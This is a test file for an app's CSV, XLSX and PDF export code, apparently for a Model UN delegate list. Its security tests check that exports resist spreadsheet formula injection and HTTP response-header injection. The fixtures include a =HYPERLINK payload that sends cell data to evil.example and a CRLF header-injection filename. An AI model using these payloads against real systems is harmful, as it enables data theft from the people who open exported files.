import { inflateRawSync } from 'node:zlib'
import { describe, expect, it } from 'vitest'
import { neutraliseFormula, toCsv } from '../src/server/exporters/csv.ts'
import { columnName, toXlsx } from '../src/server/exporters/xlsx.ts'
import { columnWidths, toPdf, toWinAnsi } from '../src/server/exporters/pdf.ts'
import { contentDisposition, renderExport } from '../src/server/exporters/index.ts'
import type { Table } from '../src/server/exporters/table.ts'

const TABLE: Table = {
  title: 'Delegates',
  subtitle: '3 delegates',
  columns: [{ header: 'Name' }, { header: 'School' }, { header: 'MUNs', numeric: true }],
  rows: [
    ['Dara Okafor', 'Riverside, High', 4],
    ['Zoë Müller', 'Hillcrest "Academy"', 2],
    ['=HYPERLINK("https://evil.example?d="&A1,"Click")', null, 0],
  ],
}

/**
 * `ignoreBOM: true` keeps the byte order mark in the decoded string.
 *
 * The default TextDecoder swallows it, which would make the BOM assertion below
 * pass or fail for a reason about the decoder rather than about the file.
 */
const decoder = new TextDecoder('utf-8', { ignoreBOM: true })

describe('CSV', () => {
  const csv = decoder.decode(toCsv(TABLE))

  it('starts with a byte order mark', () => {
    // Without it, Excel on Windows reads the file as the system codepage and
    // every accented name in it is mojibake. Checked as bytes as well as
    // characters, because that is what Excel reads.
    expect([...toCsv(TABLE).subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf])
    expect(csv.codePointAt(0)).toBe(0xfeff)
    expect(csv).toContain('Zoë Müller')
  })

  it('uses CRLF line endings', () => {
    expect(csv.split('\r\n')[0]).toBe('﻿Name,School,MUNs')
  })

  it('quotes a value containing a comma or a quote', () => {
    expect(csv).toContain('"Riverside, High"')
    expect(csv).toContain('"Hillcrest ""Academy"""')
  })

  /**
   * The security test for the whole export path.
   *
   * A delegate's name arrives through the public registration form — the only
   * unauthenticated write in the product — and nothing rejects a name beginning
   * with `=`, because names contain anything. Left alone it sits in the
   * database looking harmless until an organiser exports the list and
   * double-clicks it, at which point the spreadsheet runs it.
   */
  it('neutralises a formula in a value that came from the public form', () => {
    expect(csv).toContain(`"'=HYPERLINK(`)
    // The apostrophe has to be inside the quotes, or the quoting has undone it.
    expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/)
  })

  it('neutralises every prefix a spreadsheet treats as a formula', () => {
    for (const prefix of ['=', '+', '-', '@', '\t', '\r']) {
      expect(neutraliseFormula(`${prefix}cmd`), `${JSON.stringify(prefix)} was left executable`).toBe(
        `'${prefix}cmd`,
      )
    }
  })

  it('leaves a negative number a number', () => {
    // Applying the apostrophe to numerics is the mistake that turns a working
    // spreadsheet into a column of text nobody can sum.
    const table: Table = { title: 'n', columns: [{ header: 'Balance' }], rows: [[-5]] }
    expect(decoder.decode(toCsv(table))).toContain('\r\n-5\r\n')
  })
})

/* -------------------------------------------------------------------------- */

/** Reads a stored/deflated ZIP back, so the test verifies the file, not the intent. */
function unzip(buffer: Buffer): Map<string, string> {
  const files = new Map<string, string>()
  let offset = 0

  while (offset < buffer.length - 4) {
    if (buffer.readUInt32LE(offset) !== 0x04034b50) break

    const method = buffer.readUInt16LE(offset + 8)
    const compressedSize = buffer.readUInt32LE(offset + 18)
    const nameLength = buffer.readUInt16LE(offset + 26)
    const extraLength = buffer.readUInt16LE(offset + 28)

    const name = buffer.subarray(offset + 30, offset + 30 + nameLength).toString('utf8')
    const dataStart = offset + 30 + nameLength + extraLength
    const data = buffer.subarray(dataStart, dataStart + compressedSize)

    files.set(name, (method === 8 ? inflateRawSync(data) : data).toString('utf8'))
    offset = dataStart + compressedSize
  }

  return files
}

describe('XLSX', () => {
  const parts = unzip(toXlsx(TABLE))

  it('is a ZIP holding every part the format requires', () => {
    expect([...parts.keys()].sort()).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'xl/_rels/workbook.xml.rels',
      'xl/styles.xml',
      'xl/workbook.xml',
      'xl/worksheets/sheet1.xml',
    ])
  })

  it('ends with a central directory and an end-of-central-directory record', () => {
    const file = toXlsx(TABLE)
    expect(file.readUInt32LE(file.length - 22)).toBe(0x06054b50)
    expect(file.readUInt16LE(file.length - 22 + 10)).toBe(6)
  })

  it('writes the values into the sheet', () => {
    const sheet = parts.get('xl/worksheets/sheet1.xml')!
    expect(sheet).toContain('<t xml:space="preserve">Dara Okafor</t>')
    expect(sheet).toContain('<t xml:space="preserve">Zoë Müller</t>')
    // Numbers are numbers, not strings, or the column cannot be summed.
    expect(sheet).toContain('<v>4</v>')
  })

  it('escapes XML rather than producing a file Excel refuses to open', () => {
    const sheet = parts.get('xl/worksheets/sheet1.xml')!
    expect(sheet).toContain('&quot;Academy&quot;')
    expect(sheet).not.toContain('Hillcrest "Academy"')
  })

  it('strips control characters XML 1.0 cannot represent', () => {
    // A vertical tab arrives more often than it sounds: it is what a delegate
    // list pasted out of a PDF is full of. A raw 0x0B in a sheet is not an ugly
    // cell, it is a file Excel refuses to open with a message naming no cause.
    const table: Table = {
      title: 'n',
      columns: [{ header: 'School' }],
      rows: [['Riverside\u000BHigh']],
    }
    const sheet = unzip(toXlsx(table)).get('xl/worksheets/sheet1.xml')!
    expect(sheet).toContain('RiversideHigh')
    expect(sheet).not.toContain('\u000B')
  })

  it('does not make a formula out of a hostile name, because every string is inline', () => {
    const sheet = parts.get('xl/worksheets/sheet1.xml')!
    // `t="inlineStr"` is a string cell. Excel never evaluates one, so the CSV
    // apostrophe has no counterpart here — and must not appear.
    expect(sheet).toContain('t="inlineStr"><is><t xml:space="preserve">=HYPERLINK')
    expect(sheet).not.toContain('<f>')
  })

  it('is byte-identical for the same table', () => {
    // No timestamps anywhere in the ZIP. A checksum over the output would be
    // meaningless if the output embedded the current minute.
    expect(toXlsx(TABLE).equals(toXlsx(TABLE))).toBe(true)
  })

  it('names columns beyond Z correctly', () => {
    expect(columnName(0)).toBe('A')
    expect(columnName(25)).toBe('Z')
    expect(columnName(26)).toBe('AA')
    expect(columnName(701)).toBe('ZZ')
  })
})

/* -------------------------------------------------------------------------- */

describe('PDF', () => {
  const stamp = new Date('2026-03-14T09:30:00.000Z')
  const pdf = toPdf(TABLE, stamp)
  const text = pdf.toString('latin1')

  it('is a PDF', () => {
    expect(text.startsWith('%PDF-1.4')).toBe(true)
    expect(text.trimEnd().endsWith('%%EOF')).toBe(true)
  })

  /**
   * The cross-reference table is the part that silently breaks.
   *
   * A reader uses it to find every object by byte offset. Get one wrong and
   * some readers repair the file, some show a blank page and some refuse it —
   * so this walks each offset and checks the object header really is there.
   */
  it('has a cross-reference table whose offsets land on their objects', () => {
    const startxref = Number(/startxref\s+(\d+)/.exec(text)![1])
    expect(text.slice(startxref, startxref + 4)).toBe('xref')

    const [, countText] = /xref\s+0 (\d+)/.exec(text.slice(startxref))!
    const count = Number(countText)
    expect(count).toBeGreaterThan(5)

    const entries = [...text.slice(startxref).matchAll(/^(\d{10}) (\d{5}) ([nf])/gm)]
    expect(entries).toHaveLength(count)

    entries.slice(1).forEach((entry, index) => {
      const offset = Number(entry[1])
      expect(text.slice(offset, offset + 10), `object ${index + 1} is not at its offset`).toMatch(
        new RegExp(`^${index + 1} 0 obj`),
      )
    })
  })

  it('declares only standard-14 fonts, so nothing has to be loaded from disk', () => {
    // pdfkit reads .afm metrics files at runtime, which a serverless bundle
    // does not carry. Not depending on a font file is the whole reason this
    // writer exists.
    expect(text).toContain('/BaseFont /Helvetica-Bold')
    expect(text).toContain('/BaseFont /Courier')
    expect(text).not.toContain('/FontFile')
  })

  it('writes the heading and the rows', () => {
    expect(text).toContain('(Delegates) Tj')
    expect(text).toContain('Dara Okafor')
    expect(text).toContain('Generated 2026-03-14 09:30 UTC')
  })

  it('escapes the characters that would end a PDF string early', () => {
    const table: Table = {
      title: 'n',
      columns: [{ header: 'Name' }],
      rows: [['Ada (the\\first)']],
    }
    expect(toPdf(table, stamp).toString('latin1')).toContain('Ada \\(the\\\\first\\)')
  })

  it('maps what WinAnsi can hold and substitutes what it cannot', () => {
    expect(toWinAnsi('Zoë Müller')).toBe('Zoë Müller')
    expect(toWinAnsi('a’b')).toBe('ab')
    // Devanagari has no WinAnsi representation. `?` rather than dropping it:
    // a name rendered `Zh?ng` tells the reader a character was lost, while
    // `Zhng` looks like a typo somebody will "correct" in the database.
    expect(toWinAnsi('अजय')).toBe('???')
  })

  it('paginates rather than writing off the bottom of the page', () => {
    const many: Table = {
      title: 'Delegates',
      columns: [{ header: 'Name' }],
      rows: Array.from({ length: 300 }, (_, index) => [`Delegate ${index}`]),
    }
    const output = toPdf(many, stamp).toString('latin1')
    const pages = [...output.matchAll(/\/Type \/Page[^s]/g)]
    expect(pages.length).toBeGreaterThan(5)
    expect(output).toContain(`Page 1 of ${pages.length}`)
  })

  it('renders an empty dataset as a page that says so', () => {
    const empty: Table = { title: 'Awards', columns: [{ header: 'Award' }], rows: [] }
    expect(toPdf(empty, stamp).toString('latin1')).toContain('Nothing to list.')
  })

  it('never lets the columns exceed the page width', () => {
    const wide: Table = {
      title: 'Wide',
      columns: Array.from({ length: 12 }, (_, index) => ({ header: `Column ${index}` })),
      rows: [Array.from({ length: 12 }, () => 'x'.repeat(120))],
    }
    const widths = columnWidths(wide, 100)
    const used = widths.reduce((sum, width) => sum + width, 0) + widths.length - 1
    expect(used).toBeLessThanOrEqual(100)
    expect(Math.min(...widths)).toBeGreaterThanOrEqual(6)
  })
})

/* -------------------------------------------------------------------------- */

describe('the download itself', () => {
  const stamp = new Date('2026-03-14T09:30:00.000Z')

  it('agrees about extension and content type in every format', () => {
    expect(renderExport(TABLE, 'csv', stamp)).toMatchObject({
      contentType: 'text/csv; charset=utf-8',
      filename: 'delegates-2026-03-14.csv',
    })
    expect(renderExport(TABLE, 'xlsx', stamp).filename).toBe('delegates-2026-03-14.xlsx')
    expect(renderExport(TABLE, 'pdf', stamp).contentType).toBe('application/pdf')
  })

  it('cannot be used to inject a response header', () => {
    // The filename comes from a conference name an organiser typed, so it is
    // user input reaching a header.
    const header = contentDisposition('Zoë\r\nX-Evil: yes.csv')
    expect(header).not.toContain('\r')
    expect(header).not.toContain('\n')
    expect(header).toContain("filename*=UTF-8''")
  })
})
